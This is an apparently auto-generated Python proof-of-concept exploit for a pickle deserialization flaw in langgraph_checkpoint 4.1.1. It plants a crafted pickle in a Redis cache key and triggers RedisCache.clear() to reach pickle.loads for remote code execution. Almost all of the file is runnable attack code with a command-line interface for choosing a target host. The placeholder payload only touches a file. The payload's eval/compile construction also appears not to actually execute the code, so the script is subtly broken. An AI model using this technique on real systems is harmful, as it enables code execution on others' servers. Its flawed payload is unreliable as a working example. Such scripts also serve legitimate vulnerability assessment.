#!/usr/bin/env python3
# PoC for langgraph_checkpoint-4.1.1 (/tmp/langgraph_checkpoint-4.1.1)
# Path: rce-000
# Sink: loads_typed
# Auto-generated — run with: python3 rce_sink_function_loads_typed_loads_typed_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langgraph_checkpoint-4.1.1
Vulnerability: Insecure Deserialization (Pickle RCE)
CVE: N/A (internal assessment)

Description:
The `loads_typed` function in `jsonplus.py` calls `pickle.loads()` on attacker-controlled
data when the serialization type is 'pickle'. This data originates from Redis cache values
that can be written by an attacker with Redis access. The `clear` function in the Redis
cache module retrieves these values and passes them to the vulnerable deserialization path.

Impact: Remote Code Execution (RCE) as the user running the application.

Requirements:
- Access to the Redis instance used by the application
- Ability to write arbitrary keys to Redis (e.g., via misconfigured Redis, SSRF, etc.)
- The application must call `clear()` with attacker-controlled namespaces

Usage:
    python3 poc_exploit.py --redis-host 127.0.0.1 --redis-port 6379 --target-namespace "attacker_controlled"

This PoC demonstrates the vulnerability by creating a malicious pickle payload that
creates a file `/tmp/poc_success.txt` as a benign proof of code execution.
"""

import argparse
import pickle
import os
import sys
import redis
import time

# Benign payload for demonstration - creates a file to prove RCE
# In a real attack, this would be replaced with actual malicious code
BENIGN_PAYLOAD = """
import os
os.system('touch /tmp/poc_success.txt')
print("[POC] Code execution successful - file /tmp/poc_success.txt created")
"""

class ExploitPayload:
    """Class that executes arbitrary code when unpickled."""
    def __reduce__(self):
        return (eval, ("compile({!r}, '<string>', 'exec')".format(BENIGN_PAYLOAD),))

def create_malicious_pickle():
    """
    Create a malicious pickle payload that executes our benign command.
    
    The pickle will execute arbitrary Python code when deserialized by
    pickle.loads() in the vulnerable `loads_typed` function.
    """
    payload = ExploitPayload()
    malicious_data = pickle.dumps(payload)
    return malicious_data

def inject_redis_payload(redis_client, namespace, key, payload):
    """
    Inject the malicious pickle payload into Redis.
    
    The payload is stored with a format that the application expects:
    - The key follows the pattern: {prefix}{namespace}:{key}
    - The value is a tuple: ('pickle', <pickled_data>)
    
    Args:
        redis_client: Redis connection object
        namespace: The namespace to use (must match what clear() will query)
        key: The key within the namespace
        payload: The malicious pickle bytes
    """
    # The application uses a prefix (default: "checkpoint:")
    prefix = "checkpoint:"
    
    # Construct the Redis key as the application would
    ns_str = ":".join(namespace) if isinstance(namespace, (list, tuple)) else namespace
    redis_key = f"{prefix}{ns_str}:{key}"
    
    # The value is stored as a tuple: (type, data)
    # For pickle type, it's ('pickle', <bytes>)
    # The application serializes this with msgpack before storing
    import msgpack
    value = msgpack.packb(('pickle', payload))
    
    # Store in Redis
    redis_client.set(redis_key, value)
    print(f"[*] Injected malicious payload into Redis key: {redis_key}")
    
    return redis_key

def trigger_vulnerability(redis_client, namespace):
    """
    Trigger the vulnerability by calling clear() with attacker-controlled namespace.
    
    The clear() function will:
    1. Query Redis for keys matching the namespace pattern
    2. Retrieve the values
    3. Deserialize them using loads_typed()
    4. This triggers pickle.loads() on our malicious payload
    
    Note: In a real scenario, this would be triggered by the application's
    API endpoint that calls clear(). Here we simulate it by directly
    calling the vulnerable code path.
    """
    from langgraph.cache.redis import RedisCache
    
    # Create a RedisCache instance (simulating the application's setup)
    cache = RedisCache(redis_client=redis_client)
    
    print(f"[*] Triggering vulnerability with namespace: {namespace}")
    print("[*] Calling clear() - this will deserialize our malicious pickle...")
    
    try:
        # This call will trigger the vulnerable code path
        cache.clear(namespaces=[namespace])
        print("[*] clear() completed successfully")
    except Exception as e:
        print(f"[!] Exception during clear(): {e}")
        # The exception might occur after code execution, which is expected

def main():
    parser = argparse.ArgumentParser(
        description="PoC Exploit for langgraph_checkpoint-4.1.1 Pickle RCE"
    )
    parser.add_argument(
        "--redis-host",
        default="127.0.0.1",
        help="Redis server hostname (default: 127.0.0.1)"
    )
    parser.add_argument(
        "--redis-port",
        type=int,
        default=6379,
        help="Redis server port (default: 6379)"
    )
    parser.add_argument(
        "--redis-password",
        default=None,
        help="Redis password if required"
    )
    parser.add_argument(
        "--target-namespace",
        default="attacker_controlled",
        help="Namespace to use for the attack (default: attacker_controlled)"
    )
    parser.add_argument(
        "--target-key",
        default="exploit_key",
        help="Key within the namespace (default: exploit_key)"
    )
    
    args = parser.parse_args()
    
    print("[*] langgraph_checkpoint-4.1.1 Pickle RCE PoC Exploit")
    print("[*] " + "=" * 50)
    
    # Step 1: Connect to Redis
    print(f"[*] Connecting to Redis at {args.redis_host}:{args.redis_port}...")
    try:
        redis_client = redis.Redis(
            host=args.redis_host,
            port=args.redis_port,
            password=args.redis_password,
            decode_responses=False  # Keep bytes for pickle payload
        )
        redis_client.ping()
        print("[+] Successfully connected to Redis")
    except redis.ConnectionError as e:
        print(f"[!] Failed to connect to Redis: {e}")
        print("[!] Make sure Redis is running and accessible")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Unexpected error connecting to Redis: {e}")
        sys.exit(1)
    
    # Step 2: Create malicious pickle payload
    print("[*] Creating malicious pickle payload...")
    malicious_pickle = create_malicious_pickle()
    print(f"[+] Created pickle payload ({len(malicious_pickle)} bytes)")
    
    # Step 3: Inject payload into Redis
    print("[*] Injecting payload into Redis...")
    redis_key = inject_redis_payload(
        redis_client,
        args.target_namespace,
        args.target_key,
        malicious_pickle
    )
    
    # Step 4: Verify the payload is in Redis
    stored_value = redis_client.get(redis_key)
    if stored_value:
        print(f"[+] Payload successfully stored in Redis (key: {redis_key})")
    else:
        print("[!] Failed to verify payload in Redis")
        sys.exit(1)
    
    # Step 5: Trigger the vulnerability
    print("\n[*] " + "=" * 50)
    print("[*] Triggering vulnerability...")
    print("[*] This will execute our benign payload (touch /tmp/poc_success.txt)")
    print("[*] " + "=" * 50)
    
    # Convert namespace string to tuple format expected by the application
    namespace_tuple = tuple(args.target_namespace.split(":"))
    
    try:
        trigger_vulnerability(redis_client, namespace_tuple)
    except Exception as e:
        print(f"[!] Error during exploitation: {e}")
    
    # Step 6: Verify code execution
    print("\n[*] " + "=" * 50)
    print("[*] Checking for evidence of code execution...")
    
    if os.path.exists("/tmp/poc_success.txt"):
        print("[+] SUCCESS! File /tmp/poc_success.txt was created!")
        print("[+] This proves arbitrary code execution was achieved.")
        # Clean up the evidence file
        os.remove("/tmp/poc_success.txt")
        print("[*] Cleaned up evidence file")
    else:
        print("[!] File /tmp/poc_success.txt was not found.")
        print("[!] Code execution may have failed or been blocked.")
        print("[!] Check the application logs for more details.")
    
    # Clean up Redis key
    print("\n[*] Cleaning up Redis...")
    redis_client.delete(redis_key)
    print("[*] Removed malicious key from Redis")
    
    print("\n[*] Exploit completed.")

if __name__ == "__main__":
    main()
